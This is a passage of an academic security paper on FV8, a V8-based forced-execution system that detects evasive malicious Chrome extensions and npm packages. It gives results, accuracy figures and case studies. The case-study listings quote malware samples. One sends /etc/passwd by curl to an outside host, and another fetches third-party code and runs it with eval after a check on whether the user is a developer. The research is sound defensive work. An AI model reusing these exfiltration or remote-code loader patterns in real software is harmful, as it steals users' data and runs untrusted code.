+conducted.                                                           initial code bundle of the extensions and disregard any poten-
+                                                                     tially injected third-party code. Our rationale was supported
+Clustering evasions with DBSCAN                                      by our crawler experiments, which indicated that 98% of in-
+                                                                     jected scripts did not have a second level of evasion. To rep-
+The DBSCAN Expansion Module 4 enhances evasion and                   resent the presence of APIs in each extension, we create an
+malicious extension detection, particularly under specific ob-       N-length array, with N being 28 from the number of evasion
+fuscation scenarios. It is crucial to note that DBSCAN serves        categories that we discover and employ the DBSCAN cluster-
+for both malicious code and evasion detection, and while we          ing algorithm to the extensions. We fine-tune the DBSCAN pa-
+perform experiments on three datasets for evasions, only one         rameters with the aid of the HDBSCAN algorithm [9], which
+contains unlabeled data, offering the potential to reveal both       serves as a tool to identify our ideal hyperparameters.
+
+
+
+3754    33rd USENIX Security Symposium                                                                          USENIX Association
+5     Results                                                           General               Evasion            Browser         npm
+                                                                        Category             Category           Extensions     Packages
+5.1    Malicious npm Packages (D1)                                                         1) Email login           ✓             ✓
+                                                                                          2) Social media           ✓             ✓
+When running the npm malicious packages from D1, our                      Login                signup
+initial check reveals that approximately 11, 000 packages                                 3) Crypto wallet           ✓                ✓
+(91.6%) were present in our historical dataset. Subsequently,                                   login
+we examine how many of these packages contained npm run                                   4) Localstorage            ✓                ✓
+and install commands, excluding those with zero commands.              Timebombs
+                                                                                       5) Cookie timebomb            ✓                ✓
+This refinement results in 9,899 npm packages and we identify                                6) Country              ✓                ✗
+1, 443 packages that contain at least one evasion.                                        7) Window size             ✓                ✗
+   Regarding the evasion chains, we find 212 packages with                                8) Browser type            ✓                ✗
+chains longer than one, indicating that the first link of the                               9) OS check              ✓                ✗
+chain is online. This translates to 14.7% of the packages              Fingerprint      10) Open devtools            ✓                ✗
+with some form of third-party injection having their URLs                                  11) Visitor ID            ✓                ✗
+accessible online. In most cases, these are GitHub URLs,                                   12) Recaptcha             ✓                ✗
+which in turn inject malicious code from third-party sites. We                            13) Microphone             ✓                ✗
+identify a total of 13 unique types of evasions, with five of                             14) Phone Type             ✓                ✗
+them being exclusive to npm packages (checking if it runs                                 15) Key presses            ✓                ✗
+on a browser, verifying the availability of an IP:PORT pair,                            16) Multiple keys            ✓                ✗
+checking for writing/executing permissions, folder existence              User
+                                                                       Interaction       17) Mouse clicks            ✓                ✗
+verification, and password paths check). We analyze "Pass-                                18) Notification           ✓                ✓
+word path check" in depth in the case studies (§ 5.8).                                        Settings
+   To validate the effectiveness of our secure dockerized en-                               19) Blocked              ✓                ✗
+vironment, we successfully detected 1, 633 instances of per-             Website
+                                                                         Check          (specific websites)
+mission denied errors, which demonstrates the containment                                    20) DOM                 ✓                ✗
+of potentially malicious activities. In the case of other special-                      21) Random value             ✓                ✓
+ized evasions exclusive to npm packages, it is worth noting                               22) Server-side            ✓                ✓
+that 141 instances had the "install" command specified in the                             23) Generic Bot            ✓                ✗
+"package.json" file. However, this command was used as a                                24) Password path            ✗                ✓
+special evasion tactic, where the actual command ("npm run                Other
+                                                                                         25) IP:PORT pair            ✗                ✓
+install"), was leading to specific malicious behaviors and not                         26) Runs in-browser           ✗                ✓
+installation. Although we do not include this evasion in the                           27) W/X permission            ✗                ✓
+28, it represents an interesting evasion technique unique to                             28) Local config            ✗                ✓
+the npm ecosystem.
+   Overall in Table 4 we can see the full list of evasions both        Table 4: Evasion categories for npm packages and extensions.
+for npm packages and extensions.
+
+                                                                      directly exhibited malicious behavior.
+5.2    Malicious Extensions (D2)
+                                                                         Our system recorded a total of 819 forced executions, in-
+In order to have a measurement of comparison, we take the             dicating an average of approximately 4.1 forced executions
+latest 200 extensions from the D2 dataset with their hashes           per extension job. Additionally, we observe 198 third-party
+provided in the chrome-mal-ids repository [8] and we apply            scripts being injected, contributing an extra 87,703 lines of
+the Extension Detection Module we describe in Section 4.3.            code. During the process, we encounter 114 requests with
+We examine the resulting logs, conduct post-processing, and          ’404’ HTTP errors from the websites that inject third-party
+manually verifying their behavior. Our findings reveal that           code, which amount to 57% of the total extensions. This is
+82% of these malicious extensions employed evasion tech-              expected, since these extensions have been reported to be ma-
+niques, and all of them exhibit malicious behavior. Without           licious, and their associated websites have likely been taken
+our system in place and applying only static analysis, these          down or blocked since then. It is worth noting that all of these
+malicious extensions would not have exhibited their malicious         extensions are no longer available on the webstore. Utilizing
+behavior to the fullest. This was also the reason that they re-       previously identified malicious extensions as a verifier, we
+mained online for multiple months before being removed                demonstrate the efficacy of our system. The successful detec-
+from the Web Store [16]. The remaining 18% of malicious               tion of evasion techniques in previously flagged as malicious
+extensions did not utilize evasion techniques; instead, they          data (D2) serves as a confirmation to proceeed our analysis
+
+
+
+USENIX Association                                                                      33rd USENIX Security Symposium          3755
+                                   Scripts Found                       1 // injection outside the block
+      Chain Length
+                          (with at least that chain length)            2 if (
+          1                                          12,016            3 $('#joinShoppersIframeDiv').hasClass('
+          2                                           2,988                 joinShoppersIframeDiv')
+                                                                       4 )
+          3                                             810
+                                                                       5 return;
+          4                                             211            6 $('#jsIframeParentDiv').remove(),
+          5                                              81            7 window.JS_INSTANCE.couponCodeModal &&
+          6                                              34            8 (window.JS_INSTANCE.clickCouponCodeModal(),
+          7                                              10            9 window.JS_INSTANCE.reloadDomFields());
+          8                                               1
+                                                                       Listing 2: "Return first" evasion format caught only by DBSCAN.
+   Average Length                                      1.36
+    Total Scripts                                    16,471
+                                                                       DFS inside the code block, might miss test cases where the
+Table 5: Chain length of third-party injected scripts and # reports.   injection API is located outside the block, as its distance from
+                                                                       the block is unknown. However, DBSCAN can identify such
+                                                                       cases by checking for evasion-related APIs and clustering the
+to D3, with larger-scale testing, seeking out and analyzing as         entire file, including code outside the condition block. Such a
+many extensions as possible from the wild.                             scenario can be observed in Listing 2, where the code returns
+                                                                       after the evasive check, and the malicious behavior occurs
+                                                                       only if the evasive does not return inside the block.
+5.3    Extensions in the Wild (D3)                                        The second category involves cases where the API of the
+In total, we conduct tests on 39,592 extensions, out of which          evasion is not obfuscated, but the API of the third-party injec-
+4,948 (12,5% ) of them triggered a code block at least once.           tion is obfuscated. In such instances, the API of the injection
+The total number of forced executions amounted to 111,522              is fragmented, making it difficult for the DFS of FV8 to detect.
+resulting in an average of 2.82 forced executions per executed         However, DBSCAN can detect this testcase since it utilizes
+extension or 22.54 forced executions for extensions with at            the presense of the evasion API and it can cluster the whole
+least one forced execution. Due to the recursive nature of             file as an evasive malicious extension.
+our system’s forced execution, it applies to scripts that are             After running HDBSCAN with the API presence as input,
+injected by the currently executed script. This process can            we observe that the relevant clusters mainly contained two
+lead to nested third-party injections, forming what we refer           to six extensions each. Upon further inspection, we found
+to as an "injection chain." This chain can continue as long            duplicates from the previous Extension Detection Module,
+as each script in the chain injects the next one. In Table 5,          accounting for six extensions. In total, after excluding the
+we present a breakdown of the lengths of the injected scripts.         duplicate extensions, we manually examine 48 extensions
+We only report scripts originating from one of the extensions.         and identified 28 of them to be using evasion techniques
+The total number of script chains identified is 16,471, and            and exhibiting malicious behavior, resulting in a success rate
+we found that the longest chain consists of eight scripts. As          of 58.3%. The remaining extensions either did not employ
+we expected, most of the chains have a maximum length of               evasion techniques or showed no malicious behavior after
+two, accounting for 97% of the script chains we found. In a            manual examination. Detailed results of evasion techniques
+representative example of the recursive nature of our tool, our        and malicious categories are available in 7. The DBSCAN
+tool executes 322 lines of code, compared to the initial 10            system serves as a partial obfuscation bypass tool in cases
+lines of code, an increase of 3200%. Throughout our system,            with heavy obfuscation.
+we analyze 16,471 third-party scripts, 9,164 of which were
+unique, totaling 8,732,120 lines of executed JavaScript code.          5.5 Evaluation of Automatic Evasion Flagging
+We define code coverage as the amount of code executed,
+measured in lines of code (LoC). Overall, our system increases         False Positives Assessment
+code coverage by 11% compared to execution without our                 To assess the accuracy of our evasion detection system, we
+tool.                                                                  compiled a dataset consisting of 500 benign extensions and
+                                                                       500 confirmed malicious extensions. The selection of benign
+5.4    Clustering similar evasions                                     extensions was based on their popularity and high download
+                                                                       counts from the web store, ensuring a representative sample
+Our FV8 tool may potentially miss two types of evasive mali-           of commonly used extensions. The malicious set was de-
+cious extensions. The first category includes cases where the          rived from previously confirmed malicious cases [53]. Under
+condition block disrupts the control flow of the program with-         uniform testing conditions, each extension was run on 10 pre-
+out injecting any additional code. Our tool, which executes            determined URLs. The automatic evasion filter triggers upon
+
+
+
+3756    33rd USENIX Security Symposium                                                                          USENIX Association
+                        Metric             Value                       Category                           FV8     DBSCAN         Total
+                 True Positives (TP)        420                        Advertisement networks               31             11       42
+                False Positives (FP)        13                         Coupon deals injected                19              7       26
+                True Negatives (TN)         487                        Other extension installation          5              2        7
+                False Negatives (FN)         80                        User Tracking                        11              3       14
+                                                                       Unsafe websites (http)                3              1        4
+                      Precision             0.97
+                                                                       Blocked websites (EasyList)           5              3        8
+                     Recall (TPR)           0.84
+                                                                       History tracking                      4              1        5
+                       F1 Score             0.90                       Search results manipulation           3              0        3
+                                                                       Arbitrary file download               1              0        1
+   Table 6: FV8 evaluation examining 1000 labeled extensions.
+                                                                       TOTAL                                82             28     110
+
+detecting at least five instances of forced executions, accord-       Table 7: Malicious categories & number of extensions per category.
+ing to the specified APIs. Results are summarized in Table 6.
+The evaluation results indicate that the system identified 13
+out of 500 benign extensions as malicious, corresponding to           forced executions and at least one injection, which narrowed
+a false positive rate of 2.6%. For the malicious extensions,          down the number of extensions to 423. For each of these
+the system identified 420 out of 500 as malicious, reflecting a       extensions, we manually inspect and verify their malicious
+true positive rate of 84%. The precision measure of 0.97 and          behavior and their evasion technique. As a result, we identify
+a recall rate of 0.84 are also reported, along with an F1 score       a total of 82 extensions that exhibited both evasion techniques
+of 0.90.                                                              and malicious behavior and the comprehensive results are
+   Based on our experiments, false positives (FP) occur due to        presented in Table 7.
+local injections. This happens when an extension uses APIs               As for the final evasion count after all four modules are an-
+that we force execute, leading to the injection of another local      alyzed, we found 28 evasion categories, where 15 are unique
+file instead of a third-party resource. Our system flags only if      to extensions, five unique to npm packages and five unre-
+the injected source is third-party (i.e., not starting with chrome-   ported in previous literature, ie. Social Media login, Crypto
+extension:// ). False negatives (FN) occur because third-party        wallet login, Browser environment check, Microphone open
+resources are unavailable, preventing further code injection          and Password path check evasions.
+and, consequently, our system does not get triggered.
+
+Evasions in Benign Extensions
+                                                                      Forced Executions not Leading to Malicious Extensions
+The analysis of our detection system’s response to benign and
+malicious extensions underscores a significant disparity in           To ensure the comprehensiveness of our experiments, we also
+evasion prevalence. While only 2.6% of benign extensions              examine the rest of our results, which are instances where
+activated our automatic evasion flagging system, this contrasts       our system triggers forced execution or detects third-party
+sharply with 80% of the malicious extensions that triggered           injections incorrectly. We thoroughly investigate the reasons
+similar alerts. Furthermore, we measure the number of forced          behind these unsuccessful predictions and identify potential
+code executions and we detect 6.8 times more forced exe-              factors contributing to them. Approximately 25% of these
+cutions in malicious samples than in benign samples. These            were triggered by certain extensions utilizing APIs for local
+observations strongly suggest that evasions are far more com-         injection, leading to unintended forced execution. This high-
+mon in extensions with malicious intent. Although the pres-           lights the challenge of distinguishing between legitimate API
+ence of evasion techniques does not conclusively confirm              usage and actual third-party injections. Additionally, around
+malicious activity, it significantly correlates with behaviors        60% of those were caused by the use of setTimeout in contexts
+typically associated with such extensions.                            unrelated to third-party injections, further complicating the
+                                                                      detection process. The remaining 15% of the cases were due
+Successful Detection                                                  to instances where extensions exhibited evasion techniques
+                                                                      without any form of malicious third-party injection. In these
+Once all our experiments were completed and the results were          cases, while the extensions engaged in evasion behavior, their
+logged in the database, we run the post-processor as described        overall intent might not have been fully malicious. By gain-
+in Section 4.4. The post-processor provides us with statistics        ing a deep understanding of these nuances, we can refine our
+for each extension, such as the number of forced executions           system and enhance its accuracy in distinguishing between
+and injections. We focused on extensions that had at least five       legitimate and malicious behaviors.
+
+
+
+USENIX Association                                                                       33rd USENIX Security Symposium           3757
+                 Obfuscation                  Coverage             1 // Blocked on specific sites evasion
+                                                                   2 const blocked_websites = ['https://www.linkedin.com.*','
+                  Binary arrays                                         https://www.medium.com.*',];
+          Dead/Useless code insertion                              3 chrome.tabs.onUpdated.addListener(function (tabId,
+             Multiple files code split                                  changeInfo, tab) {
+               Try-catch blocks                                    4 let tabUrl = tab.url;
+         Hide code in dependency tree                              5 if (!(changeInfo.url || changeInfo.status) ||
+                                                                        websiteIsBlocked(tabUrl))
+      Split code in multiple dependencies                          6     return;
+                    Encoding                       #               7 [..]
+                Steganography                                      8 injectScript(tabId);
+          Dynamic code modification                #               9
+               Visual deception
+                                                                              Listing 3: Blocked on specific sites evasion.
+                     Total                    8/10 (80%)
+
+        Table 8: Obfuscation coverage of ATRES and FV8.
+                                                                   5.8    Case Studies
+                                                                   As we can see in Listing 1 that we describe in Section 1,
+                                                                   the evasion technique belongs to the timebomb category. As
+5.6    Obfuscation coverage                                        for the malicious behavior, in summary, the code snippet is
+                                                                   responsible for setting up Matomo tracking. It accomplishes
+One of the three pillars our tool addresses is code obfuscation,   this by initializing the "_paq array" with tracking commands,
+in addition to evasion code and malicious code. To precisely       configuring the Matomo tracker URL and site ID, and dy-
+define the scope of our tool and establish a clear threat model    namically loading the Matomo client script. Matomo is a
+it can handle, we have undertaken the quantification of obfus-     web analytics platform that allows website owners to track
+cation. Drawing from previous literature, we reference Ladisa      and analyze user interactions on their websites. By executing
+et al.’s work [48], which categorizes obfuscation in npm pack-     this code, the extension can secretly enable Matomo tracking
+ages into ten distinct categories. As depicted in Table 8, our     without the user’s awareness or consent, potentially leading to
+tool effectively manages eight of these ten categories (80%),      privacy violations and data collection without authorization.
+as specified in the table.                                            In another example, Listing 3 demonstrates an evasion
+   It is important to note that our tool does not claim to fully   technique where the extension checks for specific websites,
+address obfuscation. While there may be further room for           such as linkedin.com and microsoft.com in line 2, and avoids
+exploration and improvement in dealing with obfuscation, our       executing the third-party code on those sites. It is possible that
+quantifiable approach serves the dual purpose of defining the      these websites are capable of detecting bot-like behavior and
+tool’s boundaries and providing a basis for comparison with        the extension is trying to evade detection and avoid triggering
+future obfuscation research.                                       any security measures in place on those sites. By selectively
+                                                                   avoiding execution on certain websites, the extension aims to
+                                                                   conceal its malicious intentions and avoid scrutiny.
+                                                                      In another example, Listing 4 demonstrates an evasion
+5.7    Manual Verification                                         technique based on distinguishing between developer and
+                                                                   normal users in line 5. The code utilizes the eval command in
+Once our tool flags code as potentially malicious, it under-       line 13 to execute malicious code after injecting it from a third-
+goes manual verification, while evasion detection operates         party source. Additionally, this evasion method incorporates
+mostly automatically, pinpointing the precise code locations       user login status and date as part of its user tracking technique.
+for further investigation. Analyzing the 423 flagged samples       This combination of factors allows the malicious code to
+requires approximately 106 hours, with an expert JavaScript        execute selectively based on the user’s role and behavior.
+reviewer spending around 15 minutes on each sample. The               In the case of npm packages, our tool detected interesting
+precision of FV8 in identifying exact locations of evasion sig-    evasion techniques, one of which involves password path
+nificantly streamlines the review process within our dataset       checking and subsequent code execution. As illustrated in
+of 40,000 extensions. This focus allows us to concentrate on       the code snippet in Listing 5, malicious actors first check if a
+a subset—roughly 5% of the total code—markedly reducing            specific path exists (line 5) and, if it does (evaluates to 0), they
+the effort needed compared to reviewing hundreds of thou-          proceed to send the password to an external server. Our tool
+sands of lines. Consequently, our tool functions almost 100%       triggered an alert due to the use of the exec API, which is one
+automatically in flagging and detecting evasions and semi-         of the targeted APIs for forced execution in our FV8 patches
+automatically in identifying malicious code, decreasing the        for Node.js. This example highlights the effectiveness of our
+volume of code requiring manual review by 95%.                     system in identifying evasive code in npm packages.
+
+
+
+3758    33rd USENIX Security Symposium                                                                         USENIX Association
+ 1 // Eval code after dev status check                                 1     const { exec } = require('child_process');
+ 2 function getCode() {                                                2     const command = 'test -f /etc/passwd ; echo $?';
+ 3 $.get(chrome.runtime.getURL('dev.json'), function (                 3     exec(command, (error, stdout, _) => {
+      data) {                                                          4       if (error) { return; }
+ 4 console.log('Handling dev or user code')                            5       if (stdout == 0){
+ 5 1 == data.isDev                                                     6         exec("a=$(cat /etc/passwd;) && echo $a | xxd -p |
+ 6 ? $.get(chrome.runtime.getURL('dev.js'))                                   head | while read ut;do curl -X POST -H \"Content-Type
+ 7 : $.get(                                                                   : text/plain\" -d \"$a\"
+ 8     'https://botsorteios.com/app/source/?main=true&time=                   of734jazz94u3j55awdyy3k5iwonceg25.oastify.com;done");}
+      ' +                                                              7     });
+ 9       Date.now() +                                                  8
+10       '&extension=' +
+11       chrome.runtime.getManifest().version,                             Listing 5: Password path checking evasion in npm packages.
+12     function (data) {
+13       eval(JSON.parse(data).js);});});}
+14 setTimeout(() => {                                                  6.2     Comparison with previous tools
+15     clearInterval(autoLogin);
+                                                                       In broader research, we compare FV8 to related methods.
+16 }, 10000);
+                                                                       FV8 offers unique advantages in detecting evasion techniques
+    Listing 4: Eval third-party injection after user status evasion.   and malicious extensions. It is the first system for this analysis
+                                                                       in Chrome, setting it apart from prior tools like Rozzle [47]
+                                                                       and J-Force [45], which focused on older browsers and lacked
+5.9      Malicious Extensions Report to Google                         open-source availability. Unlike J-Force, FV8 uses selective
+                                                                       API-based forced execution, making it both API-targeted and
+After submitting reports on 110 extensions to Google via the           condition-driven. While Rozzle also used API targeting, it was
+official channels [29], a follow-up check two months later             limited to native element-related APIs and is now obsolete.
+showed that only 41 of these extensions remained online.               FV8 is designed for the Chromium environment, providing
+Although we received initial confirmations of the reports,             up-to-date, open-source capabilities for detecting evasions.
+Google did not provide specific confirmations or rejections
+for each case. The removal of the majority of these extensions
+indicates a largely successful outcome of our reporting efforts.
+                                                                       6.3     (F)V8 Versatility
+Notably, among the extensions that are still available on the          Our research highlights the broad significance of the V8 en-
+Webstore, most have released new version updates since our             gine, which powers not only Chromium but also Node.js, af-
+identification of malicious activity. Specifically, only seven         fecting millions of npm packages. V8 is also crucial for other
+of the reported extensions have not updated and remain at the          platforms such as MongoDB and Electron, emphasizing its ex-
+version we originally examined with our tool. This suggests a          tensive influence beyond web browsers. By utilizing the same
+significant response to our findings, either through extension         V8 patches, our approach can be adapted to enhance security
+removal or updates to address the issues we identified.                across diverse JavaScript environments, making it a versatile
+                                                                       tool for various applications and frameworks that rely on the
+                                                                       V8 engine. The adaptability of our system allows for potential
+                                                                       expansions to browser extensions beyond Chrome, including
+6     Discussion                                                       Firefox, Safari, and Microsoft Edge. Moreover, given the uni-
+                                                                       versal applicability of JavaScript, our FV8 system can also be
+                                                                       extended to other domains such as detecting malicious code
+6.1      Sustainability & Passing the Test of Time                     in phishing and detecting evasions in fingerprinting websites,
+                                                                       further broadening its protective reach and impact.
+Our research demonstrates the integration of FV8 across mul-
+tiple versions of Chromium and Node.js, showcasing its adapt-
+ability and effectiveness. FV8 effortlessly functions across           7     Limitations
+different versions, with minimal automatic adjustments, main-
+taining compatibility with the last 28 versions of Chromium.           One potential expansion of our system is to extend its capabil-
+Its implementation follows the Dockerfile/tool model, akin to          ities to other browsers such as Firefox, Safari, and Microsoft
+VisibleV8 (VV8), prioritizing accessibility and distribution           Edge. However, for this paper, we’ve concentrated on Chrome
+for researchers. FV8 will be published on DockerHub, accom-            extensions due to the dominance of the Chrome Web Store,
+panied by comprehensive documentation and per Chromi-                  hosting over 200,000 active extensions, which provides a sub-
+um/V8 version patches, facilitating its adoption in various            stantial dataset for our research. In contrast, Firefox and Safari
+research environments.                                                 have approximately 30,000 and 3,000 active extensions, most
+
+
+
+USENIX Association                                                                         33rd USENIX Security Symposium          3759
+of which are also available in the Chrome Web Store. Fo-           for static analysis to identify malicious code in npm pack-
+cusing on Chrome extensions allows us to effectively assess        ages. Ladisa et al. [48] explored algorithmic feature selection
+the prevalence of malicious behavior and evasion techniques        within the context of malicious npm packages to detect eva-
+within a diverse and extensive ecosystem. Nonetheless, we ac-      sion tactics. Recent efforts have also focused on analyzing
+knowledge the potential for future exploration and adaptation      npm packages for vulnerabilities [51] and identifying mali-
+of FV8 to encompass other browsers, aiming for a compre-           cious behavior [61]. Datasets have been established to support
+hensive understanding of extension security across different       these analyses [52]. Lastly, Kluban et al. conducted work mea-
+platforms. Notably, Brave Browser shares Chrome’s Web              suring vulnerable JavaScript [46].
+Store, including Brave extensions in our system’s coverage.
+   Finally, the attackers can potentially evade us by using        JS Evasion Numerous papers have delved into the study
+server side checks. We acknowledge that our system might           of JS evasion techniques. For instance, Maroofi et al. [50]
+face limitations when dealing with server-side checks. Such        examined the resilience of anti-phishing agencies that employ
+checks are executed on external servers, making it challenging     human verification methods, such as Google re-CAPTCHA,
+to force execute and monitor their behavior directly.              alert bot, and session-based evasion. Zhang et al. [64] intro-
+                                                                   duced Crawlphish, a system that utilizes both visual and code
+                                                                   features to detect evasion techniques in phishing webpages.
+8   Related Work
+                                                                   Their approach involves code similarity and visual analysis to
+Forced Execution Other than the previously compared Roz-           identify phishing pages and relies on J-Force for forced exe-
+zle [47], JSForce [37] and J-Force [45], other papers have         cution. Meanwhile, Kapravelos et al. [43] proposed Revolver,
+employed dynamic execution to detect evasions and mali-            a system designed to detect evasive web-related malware.
+cious extensions without modifying the JS interpreter. For
+example, Solomos et al. [57] used simulated user actions           9    Conclusion
+(mouse, keyboard, browser events) to fingerprint extensions
+in a malicious actor-controlled website. This dynamic execu-       In summary, our paper introduces FV8, an open-source and
+tion combined with simulated user actions allowed them to          powerful system built on V8 for detecting evasion, malicious,
+fingerprint more extensions than previous literature. Another      and bypassing obfuscated JavaScript code. FV8 identifies
+approach involved using honeypages to detect malicious ex-         28 evasion categories in npm packages and extensions as well
+tensions, as demonstrated by Hulk [42]. Finally, Steffens et al.   as 110 malicious extensions and has been rigorously tested
+utilized forced execution in PostMessage handlers to establish     across the last 28 V8 versions.
+exploitability in popular sites from program traces [59].
+
+                                                                   10    Reproducibility & Ethics
+Malicious, Vulnerable Extensions & npm Packages Vari-
+ous studies have investigated the detection of malicious exten-    Our tool, FV8, is available through an open-source approach.
+sions without relying on forced execution techniques. For ex-      The latest version can be found in our dedicated GitHub repos-
+ample, Sjösten et al. [56] examined browser extensions based       itory, where it is published as Chromium per-version patches.
+on web-accessible resource inclusions. Xing et al. [62] fo-        These patches ensure compatibility with other tools like VV8.
+cused on identifying malicious extensions related to advertis-     For easy access and distribution, we also provide a .deb in-
+ing injections and malvertising, while Thomas et al. [60] used     stallation file.
+dynamic analysis to detect extensions injecting affiliate links.   The repository with the latest version can be accessed here:
+Jagpal et al. [39] conducted a longitudinal three-year study on    https://github.com/wspr-ncsu/FV8.
+malicious extensions. Iqbal et al. proposed AdGraph [38] and          Regarding the malicious extensions discovered in dataset
+built their tool on top of JSGraph [49], where they modified       D3, we reported our findings to Google for their review to
+V8 for dynamic execution within the Blink engine but did not       determine if these extensions violate the Terms of Service
+employ forced execution, rendering their system susceptible        (ToS) of the Web Store. Our reporting process aligns with
+to evasion techniques. Pantelaios et al. [54] detected mali-       the official reporting guidelines outlined in [5]. The majority
+cious extensions based on user feedback and later applied          (62.7%) has been removed from the Webstore.
+DBSCAN clustering. However, their approach remained vul-
+nerable to evasions and obfuscation. Additionally, Chakradeo
+et al. introduced the MAST tool, which measures malicious          11    Acknowledgements
+applications in the mobile ecosystem, using similar static
+analysis techniques [32]. Concerning npm packages, Zhang           We thank the anonymous reviewers for their helpful feedback.
+et al. [63] applied machine learning techniques to detect mali-    This work was supported by the National Science Foundation
+cious npm packages, while Froh et al. [36] used CodeQL [7]         (NSF) under grants CNS-2138138 and CNS-2047260.
+
+
+
+3760    33rd USENIX Security Symposium                                                                      USENIX Association
+References                                                      [15] Malicious browser extensions now include eva-
+                                                                     sions. https://gosecure.net/blog/2022/02/10/
+ [1] Catapult - web page replay. https://chromium.                   malicious-chrome-browser-extension-exposed-
+     googlesource.com/catapult, 2023.                                chromeback-leverages-silent-extension-
+                                                                     loading/, 2023.
+ [2] Chrome market share. https://gs.statcounter.
+     com/browser-market-share, 2023.                            [16] Malicious extensions found.        https://
+                                                                     thehackernews.com/2020/02/chrome-extension-
+ [3] Chrome market share in august 2023.   https:                    malware.html, 2023.
+     //www.oberlo.com/statistics/browser-market-
+     share#:~:text=As%20of%20August%202023%2C%                  [17] Malicious npm packages now include evasion tech-
+     20Google’s,%25%2C%2043.71%20percentage%                         niques.    https://www.scmagazine.com/brief/
+     20points%20behind., 2023.                                       malicious-pypi-npm-packages-facilitate-
+                                                                     data-exfiltration, 2023.
+ [4] Chrome web store. https://chrome.google.com/
+     webstore/category/extensions, 2023.                        [18] Manifest v2 support by brave.         https:
+                                                                     //www.ghacks.net/2022/09/29/brave-browser-
+ [5] Chrome web store report procedure.    https:                    manifest-v2-extensions-after-v3-update,
+     //support.google.com/chrome_webstore/                           2023.
+     answer/7508032?hl=en#:~:text=Sign%20in%
+     20to%20the%20Chrome,the%20form%2C%20then%                  [19] Manifest v2 support by firefox.       https:
+     20click%20Submit, 2023.                                         //adguard.com/en/blog/firefox-manifestv3-
+                                                                     chrome-adblocking.html, 2023.
+ [6] Clustering algorithm dbscan. https://scikit-
+                                                                [20] Manifest v2 support timeline by google. https:
+     learn.org/stable/modules/generated/sklearn.
+                                                                     //developer.chrome.com/docs/extensions/
+     cluster.DBSCAN.html, 2023.
+                                                                     migrating/mv2-sunset, 2023.
+ [7] Codeql official website.    https://codeql.github.
+                                                                [21] Number of node.js packages in the npm registry. https:
+     com/, 2023.
+                                                                     //deps.dev/, 2023.
+ [8] Github repository with a collection of malicious           [22] Obfuscation  prevalence in   recent findings.
+     extensions. https://github.com/mallorybowes/                    https://www.akamai.com/blog/security/over-
+     chrome-mal-ids, 2023.                                           25-percent-of-malicious-javascript-is-
+                                                                     being-obfuscated, 2023.
+ [9] Hdbscan for parameter tuning of clustering algo-
+     rithms.  https://hdbscan.readthedocs.io/en/                [23] Osv database with malicious npm packages. https:
+     latest/how_hdbscan_works.html, 2023.                            //osv.dev/list?ecosystem=npm&q=MAL, 2023.
+[10] Iroh.js dynamic analysis tool. https://github.com/         [24] Phishing kits now include evasion techniques.
+     maierfelix/Iroh, 2023.                                          https://www.zerofox.com/blog/phishing-
+                                                                     kits-with-cloaked-techniques-the-next-
+[11] Jalangi dynamic analysis tool. https://github.com/              generation-of-phishing-attacks/, 2023.
+     Samsung/jalangi2, 2023.
+                                                                [25] Puppeteer. https://developer.chrome.com/docs/
+[12] Latest lts node.js version. https://nodejs.org/en,              puppeteer, 2023.
+     2023.
+                                                                [26] Recent time based evasion.      https://www.
+[13] Malicious browser extensions affecting 87 million users.        securityweek.com/14-million-users-install-
+     https://usa.kaspersky.com/blog/dangerous-                       chrome-extensions-inject-code-ecommerce-
+     chrome-extensions-87-million/28561/, 2023.                      sites/, 2023.
+
+[14] Malicious browser extensions found by avast secu-          [27] Top 10 malware families in 2023. https://blog.
+     rity.  https://decoded.avast.io/janvojtesek/                    checkpoint.com/security/august-2023s-most-
+     backdoored-browser-extensions-hid-                              wanted-malware-new-chromeloader-campaign-
+     malicious-traffic-in-analytics-requests/,                       spreads-malicious-browser-extensions-while-
+     2023.                                                           qbot-is-shut-down-by-fbi/, 2023.
+
+
+
+USENIX Association                                                               33rd USENIX Security Symposium      3761
+[28] Xvfb.   https://www.x.org/releases/X11R7.6/                  [39] Nav Jagpal, Eric Dingle, Jean-Philippe Gravel, Panayi-
+     doc/man/man1/Xvfb.1.xhtml, 2023.                                  otis Mavrommatis, Niels Provos, Moheeb Abu Rajab,
+                                                                       and Kurt Thomas. Trends and lessons from three years
+[29] Report to google. https://support.google.com/                     fighting malicious extensions. In 24th USENIX Secu-
+     chrome/answer/95315, 2024.                                        rity Symposium (USENIX Security 15), pages 579–593,
+                                                                       Washington, D.C., August 2015. USENIX Association.
+[30] Tranco list website.      https://tranco-list.eu/,
+     2024.                                                        [40] Jordan Jueckstock and Alexandros Kapravelos. Visi-
+                                                                       bleV8: In-browser Monitoring of JavaScript in the Wild.
+[31] Shubham Agarwal. Helping or hindering? how browser                In Proceedings of the ACM Internet Measurement Con-
+     extensions undermine security. In Proceedings of the              ference (IMC), October 2019.
+     2022 ACM SIGSAC Conference on Computer and Com-
+     munications Security, CCS ’22, page 23–37, New York,         [41] Jordan Jueckstock, Shaown Sarker, Peter Snyder, Aidan
+     NY, USA, 2022. Association for Computing Machinery.               Beggs, Panagiotis Papadopoulos, Matteo Varvello, Ben-
+                                                                       jamin Livshits, and Alexandros Kapravelos. Towards
+[32] Saurabh Chakradeo, Bradley Reaves, Patrick Traynor,               realistic and reproducibleweb crawl measurements. In
+     and William Enck. Mast: Triage for market-scale mobile            Proceedings of the Web Conference 2021, WWW ’21,
+     malware analysis. In Proceedings of the Sixth ACM                 page 80–91, New York, NY, USA, 2021. Association
+     Conference on Security and Privacy in Wireless and                for Computing Machinery.
+     Mobile Networks, WiSec ’13, page 13–24, New York,
+     NY, USA, 2013. Association for Computing Machinery.          [42] Alexandros Kapravelos, Chris Grier, Neha Chachra,
+                                                                       Christopher Kruegel, Giovanni Vigna, and Vern Paxson.
+[33] Aurore Fass, Michael Backes, and Ben Stock. Hi-                   Hulk: Eliciting malicious behavior in browser exten-
+     denoseek: Camouflaging malicious javascript in benign             sions. In 23rd USENIX Security Symposium (USENIX
+     asts. In Proceedings of the 2019 ACM SIGSAC Confer-               Security 14), pages 641–654, San Diego, CA, August
+     ence on Computer and Communications Security, CCS                 2014. USENIX Association.
+     ’19, page 1899–1913, New York, NY, USA, 2019. Asso-
+                                                                  [43] Alexandros Kapravelos, Yan Shoshitaishvili, Marco
+     ciation for Computing Machinery.
+                                                                       Cova, Christopher Kruegel, and Giovanni Vigna. Re-
+[34] Aurore Fass, Michael Backes, and Ben Stock. Jstap:                volver: An automated approach to the detection of
+     A static pre-filter for malicious javascript detection. In        evasiveweb-based malware. In Proceedings of the
+     Proceedings of the 35th Annual Computer Security Ap-              22nd USENIX Conference on Security, SEC’13, page
